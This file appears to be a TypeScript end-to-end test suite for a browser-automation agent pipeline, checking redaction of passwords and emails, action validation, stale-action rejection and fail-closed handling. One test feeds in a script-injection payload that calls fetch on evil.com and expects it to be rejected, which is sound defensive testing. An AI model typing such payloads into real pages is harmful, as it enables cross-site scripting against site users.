/**
 * M01: End-to-End System Integration & Security Verification Test Suite (T015)
 * Author: AI010 (Browser Execution & Integration Engineer)
 *
 * Verifies the complete VEIL autonomous loop:
 * Browser -> Observation -> Perception -> Fusion -> Privacy -> Sanitization
 * -> Reasoning -> Action Validation -> Browser Execution -> Re-Observation -> Complete
 */

import { VeilOrchestrator } from '../orchestrator';
import { RawObservation, CDP } from '../../m02-observation/types';
import { ReasoningGateway } from '../../m09-reasoning/reasoningGateway';
import { ReasoningProvider, ReasoningRequest } from '../../m09-reasoning/types';
import { BrowserExecutor } from '../../m11-executor/browserExecutor';
import { CdpEventDispatcher } from '../../m11-executor/types';
import { SanitizedObservation } from '../../m08-sanitization/types';
import { ObservationManager } from '../../m02-observation/observationManager';
import { createMockDebuggerAPI } from '../../m02-observation/tests/testUtils';
import { VisualPerceptionManager } from '../../m03-visual/visualPerceptionManager';
import { VisualEvidence } from '../../m03-visual/types';
import { TesseractAdapter } from '../../m05-ocr/tesseractAdapter';
import { OcrEngine, OcrEvidence } from '../../m05-ocr/types';

export async function runT015Tests(): Promise<{ name: string; passed: boolean; error?: string }[]> {
  const results: { name: string; passed: boolean; error?: string }[] = [];

  function assert(condition: boolean, msg: string) {
    if (!condition) throw new Error(msg);
  }

  function assertEqual<T>(actual: T, expected: T, msg: string) {
    if (actual !== expected) {
      throw new Error(`${msg}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    }
  }

  async function test(name: string, fn: () => Promise<void> | void) {
    try {
      await fn();
      results.push({ name, passed: true });
    } catch (err: any) {
      results.push({ name, passed: false, error: err.message || String(err) });
    }
  }

  class MockCdpDispatcher implements CdpEventDispatcher {
    public commands: Array<{ method: string; params?: Record<string, unknown> }> = [];
    async sendCommand<T = unknown>(method: string, params?: Record<string, unknown>): Promise<T> {
      this.commands.push({ method, params });
      return {} as T;
    }
  }

  function createMockRawObservation(id: string, options?: { username?: string; passwordValue?: string }): RawObservation {
    const username = options?.username ?? 'alice';
    const password = options?.passwordValue ?? 'secret_password_123';

    const domTree: CDP.DOM.Node = {
      nodeId: 1,
      nodeType: 1,
      nodeName: 'HTML',
      children: [
        {
          nodeId: 2,
          nodeType: 1,
          nodeName: 'BODY',
          children: [
            {
              nodeId: 3,
              backendNodeId: 101,
              nodeType: 1,
              nodeName: 'INPUT',
              attributes: ['type', 'text', 'placeholder', 'Username', 'value', username, 'role', 'textbox'],
            },
            {
              nodeId: 4,
              backendNodeId: 102,
              nodeType: 1,
              nodeName: 'INPUT',
              attributes: ['type', 'password', 'placeholder', 'Password', 'value', password, 'role', 'password'],
            },
            {
              nodeId: 5,
              backendNodeId: 103,
              nodeType: 1,
              nodeName: 'BUTTON',
              attributes: ['type', 'submit', 'role', 'button'],
              children: [{ nodeId: 6, nodeType: 3, nodeName: '#text', nodeValue: 'Confirm Booking' }],
            },
            {
              nodeId: 7,
              backendNodeId: 104,
              nodeType: 1,
              nodeName: 'DIV',
              attributes: ['role', 'banner'],
              children: [{ nodeId: 8, nodeType: 3, nodeName: '#text', nodeValue: 'Contact support: agent@airline.com' }],
            },
          ],
        },
      ],
    };

    const a11yTree: CDP.Accessibility.AXNode[] = [
      {
        nodeId: 'ax-1',
        ignored: false,
        backendDOMNodeId: 101,
        role: { type: 'role', value: 'textbox' },
        name: { type: 'name', value: 'Username' },
      },
      {
        nodeId: 'ax-2',
        ignored: false,
        backendDOMNodeId: 102,
        role: { type: 'role', value: 'password' },
        name: { type: 'name', value: 'Password' },
      },
      {
        nodeId: 'ax-3',
        ignored: false,
        backendDOMNodeId: 103,
        role: { type: 'role', value: 'button' },
        name: { type: 'name', value: 'Confirm Booking' },
      },
    ];

    return {
      observation_id: id,
      timestamp: Date.now(),
      screenshot: {
        format: 'png',
        data: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
        viewport: { width: 1280, height: 720, dpr: 1 },
      },
      dom_tree: domTree,
      a11y_tree: a11yTree,
    };
  }

  // 1. Full E2E Loop: Single action to completion (CLICK -> DONE)
  await test('1. Full E2E Loop: User goal "Click Confirm Booking" executes through entire pipeline', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp, clickDelayMs: 0 });

    let capturedSanitizedObs: any = null;
    let stepCount = 0;

    class ScriptedReasoner implements ReasoningProvider {
      public readonly providerId = 'scripted';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        stepCount++;

        if (stepCount === 1) {
          const submitNode = request.nodes.find((n) => n.text?.includes('Confirm Booking'));
          assert(!!submitNode, 'Confirm Booking node must be present in sanitized observation');

          return {
            action_id: 'act-scripted-click',
            observation_id: request.observation_id,
            action_type: 'CLICK',
            target_id: submitNode!.target_id,
            intended_effect: 'Click confirm booking',
          };
        } else {
          return {
            action_id: 'act-scripted-done',
            observation_id: request.observation_id,
            action_type: 'DONE',
            intended_effect: 'Task complete',
          };
        }
      }
    }

    const gateway = new ReasoningGateway({ provider: new ScriptedReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Click Confirm Booking', {
      maxSteps: 2,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => createMockRawObservation('obs-e2e-1'),
    });

    if (!result.success) {
      throw new Error(`Orchestrator failed in test 1: ${result.errorMessage}`);
    }
    assertEqual(result.stepsExecuted, 2, 'Executed 2 steps to completion');
    assertEqual(result.history[0].validatedAction.action_type, 'CLICK', 'Action type is CLICK');
    assertEqual(result.history[0].executionResult.status, 'SUCCESS', 'Execution result status SUCCESS');
    assertEqual(result.history[1].validatedAction.action_type, 'DONE', 'Final action is DONE');
    assert(mockCdp.commands.length >= 3, 'CDP commands were sent to browser');

    // Verify privacy boundary on captured observation
    assert(!!capturedSanitizedObs, 'Sanitized observation reached reasoner');
    const sensitiveBanner = capturedSanitizedObs.nodes.find((n: any) => n.text?.includes('agent@airline.com'));
    assert(!sensitiveBanner, 'Email agent@airline.com must NOT appear in raw text');
    const redactedEmailNode = capturedSanitizedObs.nodes.find((n: any) => n.text?.includes('[REDACTED:EMAIL]'));
    assert(!!redactedEmailNode, 'Sensitive email must be sanitized to [REDACTED:EMAIL]');
  });

  // 2. Multi-step Re-Observation Loop with state mutation and completion (TYPE -> CLICK -> DONE)
  await test('2. Multi-step Re-Observation Loop: Type username -> Click Submit -> DONE with new observation IDs', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp, clickDelayMs: 0 });

    let currentStep = 0;
    const observationIdsSeen: string[] = [];

    class MultiStepReasoner implements ReasoningProvider {
      public readonly providerId = 'multistep';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        observationIdsSeen.push(request.observation_id);
        currentStep++;

        if (currentStep === 1) {
          const inputNode = request.nodes.find((n) => n.role === 'textbox');
          return {
            action_id: 'act-step-1',
            observation_id: request.observation_id,
            action_type: 'TYPE',
            target_id: inputNode!.target_id,
            parameters: { text: 'charlie' },
            intended_effect: 'Type charlie',
          };
        } else if (currentStep === 2) {
          const btnNode = request.nodes.find((n) => n.role === 'button');
          return {
            action_id: 'act-step-2',
            observation_id: request.observation_id,
            action_type: 'CLICK',
            target_id: btnNode!.target_id,
            intended_effect: 'Click submit',
          };
        } else {
          return {
            action_id: 'act-step-3',
            observation_id: request.observation_id,
            action_type: 'DONE',
            intended_effect: 'Task complete',
          };
        }
      }
    }

    const gateway = new ReasoningGateway({ provider: new MultiStepReasoner() });
    const orchestrator = new VeilOrchestrator();

    let obsCounter = 0;
    const result = await orchestrator.run('Login and submit', {
      maxSteps: 5,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => {
        obsCounter++;
        return createMockRawObservation(`obs-multistep-${obsCounter}`);
      },
    });

    assertEqual(result.success, true, 'Multi-step task succeeded');
    assertEqual(result.finalState, 'COMPLETED', 'Final state is COMPLETED');
    assertEqual(result.stepsExecuted, 3, 'Executed 3 steps to completion');

    // Verify Re-Observation Invariant: Each step MUST have a unique observation_id!
    assertEqual(observationIdsSeen.length, 3, '3 observations were generated');
    assertEqual(observationIdsSeen[0], 'obs-multistep-1', 'Step 1 used observation 1');
    assertEqual(observationIdsSeen[1], 'obs-multistep-2', 'Step 2 used observation 2');
    assertEqual(observationIdsSeen[2], 'obs-multistep-3', 'Step 3 used observation 3');
    assert(observationIdsSeen[0] !== observationIdsSeen[1], 'Step 2 generated a fresh observation_id');
    assert(observationIdsSeen[1] !== observationIdsSeen[2], 'Step 3 generated a fresh observation_id');
  });

  // 3. Privacy Invariant: Sensitive raw credentials never cross reasoning boundary
  await test('3. Privacy Invariant: Raw password value NEVER crosses reasoning gateway boundary', async () => {
    let capturedSanitizedObs: any = null;

    class PrivacyAuditReasoner implements ReasoningProvider {
      public readonly providerId = 'privacy-audit';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        return {
          action_id: 'act-audit',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Done',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new PrivacyAuditReasoner() });
    const orchestrator = new VeilOrchestrator();

    await orchestrator.run('Audit privacy', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () =>
        createMockRawObservation('obs-priv-audit', {
          passwordValue: 'super_confidential_pw_999!',
        }),
    });

    assert(!!capturedSanitizedObs, 'Sanitized observation reached reasoner');
    const payloadString = JSON.stringify(capturedSanitizedObs);
    assert(!payloadString.includes('super_confidential_pw_999!'), 'Raw password NEVER appears in reasoning payload');

    const passwordNode = capturedSanitizedObs.nodes.find((n: any) => n.role === 'password');
    assert(!!passwordNode, 'Password node present');
    assertEqual(passwordNode.text, '[REDACTED:PASSWORD]', 'Password text replaced with [REDACTED:PASSWORD]');
  });

  // 4. Privacy Invariant: Raw DOM tree, A11y tree, and raw screenshot never reach reasoner
  await test('4. Privacy Invariant: Raw DOM tree, A11y tree, and raw OCR evidence never reach reasoner', async () => {
    let capturedSanitizedObs: any = null;

    class StructuralAuditReasoner implements ReasoningProvider {
      public readonly providerId = 'structural-audit';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        return {
          action_id: 'act-done',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Done',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new StructuralAuditReasoner() });
    const orchestrator = new VeilOrchestrator();

    await orchestrator.run('Check raw leak', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-structural-leak-check'),
    });

    assert(capturedSanitizedObs.dom_tree === undefined, 'dom_tree must NOT exist in reasoner observation');
    assert(capturedSanitizedObs.a11y_tree === undefined, 'a11y_tree must NOT exist in reasoner observation');
    assert(capturedSanitizedObs.raw_ocr === undefined, 'raw_ocr must NOT exist in reasoner observation');
  });

  // 5. Action Authority Invariant: T012 cannot directly execute browser actions
  await test('5. Action Authority: T014 rejects raw ActionProposal directly from T012 without T013 validation', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp });

    const rawProposal = {
      action_id: 'act-bypass-guard',
      observation_id: 'obs-1',
      action_type: 'CLICK',
      target_id: 'btn-target',
      intended_effect: 'Bypass T013 Action Guard',
    };

    const res = await executor.execute(rawProposal);
    assertEqual(res.status, 'REJECTED', 'Executor rejected raw ActionProposal');
    assertEqual(mockCdp.commands.length, 0, 'Zero browser commands dispatched');
  });

  // 6. Stale Action Protection: Stale observation ID fails closed
  await test('6. Stale Action Protection: ActionProposal bound to previous observation_id is rejected', async () => {
    class StaleReplayReasoner implements ReasoningProvider {
      public readonly providerId = 'stale-replay';
      async proposeAction(_request: ReasoningRequest): Promise<unknown> {
        return {
          action_id: 'act-stale-replay',
          observation_id: 'obs-OLD-OUTDATED', // Mismatched observation_id
          action_type: 'CLICK',
          target_id: 'btn-1',
          intended_effect: 'Execute against old state',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new StaleReplayReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Stale test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-FRESH-1'),
    });

    assertEqual(result.success, false, 'Stale replay must fail');
    assertEqual(result.finalState, 'ABORTED', 'Final state is ABORTED');
    assert(
      result.errorMessage?.includes('OBSERVATION_ID_MISMATCH') ||
        result.errorMessage?.includes('OBSERVATION_BINDING_MISMATCH') ||
        false,
      'Fails with observation ID mismatch'
    );
  });

  // 7. Security Invariant: Prompt injection / Script injection in parameters is rejected
  await test('7. Security Invariant: Script injection attempt in reasoning parameters is rejected fail-closed', async () => {
    class ScriptInjectionReasoner implements ReasoningProvider {
      public readonly providerId = 'script-injection';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        const inputNode = request.nodes.find((n) => n.role === 'textbox');
        return {
          action_id: 'act-xss-attempt',
          observation_id: request.observation_id,
          action_type: 'TYPE',
          target_id: inputNode!.target_id,
          parameters: { text: '<script>fetch("http://evil.com")</script>' },
          intended_effect: 'Execute script injection',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new ScriptInjectionReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Injection test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-inject-1'),
    });

    assertEqual(result.success, false, 'Script injection proposal rejected');
    assertEqual(result.finalState, 'ABORTED', 'State is ABORTED');
    assert(
      result.errorMessage?.includes('SCRIPT_INJECTION_DETECTED') ||
        result.errorMessage?.includes('MALFORMED_MODEL_RESPONSE') ||
        result.errorMessage?.includes('prohibited executable script payload') ||
        result.errorMessage?.includes('INVALID_ACTION_PROPOSAL') ||
        false,
      'Script injection caught'
    );
  });

  // 8. Fail-Closed: Browser execution failure does not trigger unsafe fallback
  await test('8. Fail-Closed: CDP execution failure halts pipeline safely without unsafe fallback', async () => {
    const mockCdp = new MockCdpDispatcher();
    mockCdp.sendCommand = async () => {
      throw new Error('CDP target tab crashed');
    };
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp });

    class NormalReasoner implements ReasoningProvider {
      public readonly providerId = 'normal';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        const btnNode = request.nodes.find((n) => n.role === 'button');
        return {
          action_id: 'act-click-fail',
          observation_id: request.observation_id,
          action_type: 'CLICK',
          target_id: btnNode!.target_id,
          intended_effect: 'Click',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new NormalReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Crash test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => createMockRawObservation('obs-crash-1'),
    });

    assertEqual(result.success, false, 'Crashed CDP run reported as failure');
    assert(result.errorMessage?.includes('Execution failed') || false, 'Error message captures failure');
  });

  // 9. Visual Perception Integration: M03 ShowUI visual evidence enters M06 Perception Fusion
  await test('9. Visual Perception Integration: Visual evidence from M03 enters M06 and participates in fusion', async () => {
    class TestVisualPerceptionManager extends VisualPerceptionManager {
      override async processScreenshot(): Promise<VisualEvidence> {
        return {
          source: 'ShowUI-2B',
          elements: [
            {
              bbox: { x: 10, y: 10, width: 100, height: 40 },
              label: 'Visual Confirm Button',
              confidence: 0.94,
            },
          ],
        };
      }
    }

    let capturedRequest: ReasoningRequest | null = null;
    class VisualCheckReasoner implements ReasoningProvider {
      public readonly providerId = 'visual-check';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedRequest = request;
        return {
          action_id: 'act-vis-done',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Complete test',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new VisualCheckReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Perceive visual evidence', {
      maxSteps: 1,
      reasoningGateway: gateway,
      visualPerceptionManager: new TestVisualPerceptionManager(),
      observationProvider: async () => createMockRawObservation('obs-visual-test-1'),
    });

    assertEqual(result.success, true, 'Pipeline executed with M03 visual perception');
    assert(!!capturedRequest, 'Sanitized observation reached reasoner');
    assert(capturedRequest!.nodes.length > 0, 'Nodes present in sanitized observation');
  });

  // 10. OCR Evidence Integration: M05 OCR evidence enters M06 Perception Fusion
  await test('10. OCR Evidence Integration: OCR evidence from M05 enters M06 and participates in fusion', async () => {
    class TestOcrEngine implements OcrEngine {
      public readonly engineName = 'Tesseract.js';
      async initialize(): Promise<void> {}
      async terminate(): Promise<void> {}
      async process(): Promise<OcrEvidence | null> {
        return {
          source: 'Tesseract.js',
          elements: [
            {
              bbox: { x: 10, y: 10, width: 100, height: 40 },
              text: 'Confirm Booking',
              confidence: 0.96,
            },
          ],
        };
      }
    }

    let capturedRequest: ReasoningRequest | null = null;
    class OcrCheckReasoner implements ReasoningProvider {
      public readonly providerId = 'ocr-check';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedRequest = request;
        return {
          action_id: 'act-ocr-done',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Complete test',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new OcrCheckReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Perceive OCR evidence', {
      maxSteps: 1,
      reasoningGateway: gateway,
      ocrEngine: new TestOcrEngine(),
      observationProvider: async () => createMockRawObservation('obs-ocr-test-1'),
    });

    assertEqual(result.success, true, 'Pipeline executed with M05 OCR evidence');
    assert(!!capturedRequest, 'Sanitized observation reached reasoner');
  });

  // 11. Real M11 CDP Integration: BrowserExecutor automatically connects to tab CDPSession
  await test('11. Real M11 CDP Integration: BrowserExecutor automatically binds to active tab CDPSession', async () => {
    const mockDebugger = createMockDebuggerAPI();
    const obsManager = new ObservationManager({ debuggerApi: mockDebugger.api });

    class DoneReasoner implements ReasoningProvider {
      public readonly providerId = 'done';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        return {
          action_id: 'act-done-cdp',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Task complete',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new DoneReasoner() });
    const orchestrator = new VeilOrchestrator({ observationManager: obsManager });

    // Note: browserExecutor is NOT passed — orchestrator must automatically bind to CDPSession for tab 42!
    const result = await orchestrator.run('Test Real CDP Binding', {
      tabId: 42,
      maxSteps: 1,
      reasoningGateway: gateway,
    });

    assertEqual(result.success, true, 'Execution completed successfully via real CDP session binding');
    assertEqual(result.finalState, 'COMPLETED', 'Final state is COMPLETED');
    assertEqual(mockDebugger.getAttachedTabId(), 42, 'Attached to target tab 42');
  });

  // 12. Real M11 CDP Dispatch & Re-Observation: CLICK dispatches CDP mouse events then captures fresh observation
  await test('12. Real M11 CDP Dispatch & Re-Observation: CLICK dispatches CDP mouse events and triggers fresh observation', async () => {
    const mockDebugger = createMockDebuggerAPI();
    mockDebugger.setMockCommand('DOM.getDocument', () => ({
      root: {
        nodeId: 1,
        backendNodeId: 100,
        nodeType: 9,
        nodeName: '#document',
        childNodeCount: 1,
        children: [
          {
            nodeId: 2,
            backendNodeId: 101,
            nodeType: 1,
            nodeName: 'HTML',
            children: [
              {
                nodeId: 3,
                backendNodeId: 102,
                nodeType: 1,
                nodeName: 'BUTTON',
                attributes: ['type', 'submit', 'role', 'button'],
                children: [{ nodeId: 4, nodeType: 3, nodeName: '#text', nodeValue: 'Submit' }],
              },
            ],
          },
        ],
      },
    }));
    mockDebugger.setMockCommand('Accessibility.getFullAXTree', () => ({
      nodes: [
        {
          nodeId: 'ax-btn-1',
          ignored: false,
          backendDOMNodeId: 102,
          role: { type: 'role', value: 'button' },
          name: { type: 'name', value: 'Submit' },
        },
      ],
    }));
    mockDebugger.setMockCommand('DOM.getBoxModel', () => ({
      model: {
        content: [100, 100, 200, 100, 200, 140, 100, 140],
        width: 100,
        height: 40,
      },
    }));

    const obsManager = new ObservationManager({ debuggerApi: mockDebugger.api });

    const observationIdsSeen: string[] = [];
    let stepCount = 0;

    class ClickThenDoneReasoner implements ReasoningProvider {
      public readonly providerId = 'click-done';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        observationIdsSeen.push(request.observation_id);
        stepCount++;

        if (stepCount === 1) {
          const btnNode = request.nodes.find((n) => n.role === 'button' || n.interactable);
          assert(!!btnNode, 'Button node must be found');
          return {
            action_id: 'act-click-real-cdp',
            observation_id: request.observation_id,
            action_type: 'CLICK',
            target_id: btnNode!.target_id,
            intended_effect: 'Click target element',
          };
        } else {
          return {
            action_id: 'act-done-real-cdp',
            observation_id: request.observation_id,
            action_type: 'DONE',
            intended_effect: 'Finish task after re-observation',
          };
        }
      }
    }

    const gateway = new ReasoningGateway({ provider: new ClickThenDoneReasoner() });
    const orchestrator = new VeilOrchestrator({ observationManager: obsManager });

    const result = await orchestrator.run('Click and re-observe', {
      tabId: 77,
      maxSteps: 2,
      reasoningGateway: gateway,
    });

    assertEqual(result.success, true, 'Pipeline executed multi-step with real CDP');
    assertEqual(result.stepsExecuted, 2, '2 steps executed');
    assertEqual(observationIdsSeen.length, 2, 'Two distinct observations captured');
    assert(observationIdsSeen[0] !== observationIdsSeen[1], 'New observation_id generated on re-observation');

    // Verify CDP command log received Input.dispatchMouseEvent
    const commandLog = mockDebugger.getCommandLog();
    const mouseEvents = commandLog.filter((cmd) => cmd.method === 'Input.dispatchMouseEvent');
    assert(mouseEvents.length >= 2, 'CDP Input.dispatchMouseEvent dispatched');
  });

  // 13. Fail-Closed Perception Invariant: Failing Visual or OCR does NOT invent fake evidence
  await test('13. Fail-Closed Perception: Failing Visual or OCR component does not inject fabricated evidence', async () => {
    class ThrowingVisualManager extends VisualPerceptionManager {
      override async processScreenshot(): Promise<VisualEvidence> {
        throw new Error('Visual model weights unavailable');
      }
    }

    class ThrowingOcrEngine implements OcrEngine {
      public readonly engineName = 'Tesseract.js';
      async initialize(): Promise<void> {}
      async terminate(): Promise<void> {}
      async process(): Promise<OcrEvidence | null> {
        throw new Error('Tesseract worker crashed');
      }
    }

    let capturedRequest: ReasoningRequest | null = null;
    class CheckReasoner implements ReasoningProvider {
      public readonly providerId = 'check';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedRequest = request;
        return {
          action_id: 'act-done-fail-closed',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Task complete',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new CheckReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Fail closed test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      visualPerceptionManager: new ThrowingVisualManager(),
      ocrEngine: new ThrowingOcrEngine(),
      observationProvider: async () => createMockRawObservation('obs-fail-closed-1'),
    });

    assertEqual(result.success, true, 'Orchestrator continues safely with available DOM evidence');
    assert(!!capturedRequest, 'Sanitized observation delivered to reasoner');
    for (const node of capturedRequest!.nodes) {
      assert(typeof node.target_id === 'string' && node.target_id.length > 0, 'Target ID is valid');
    }
  });

  return results;
}
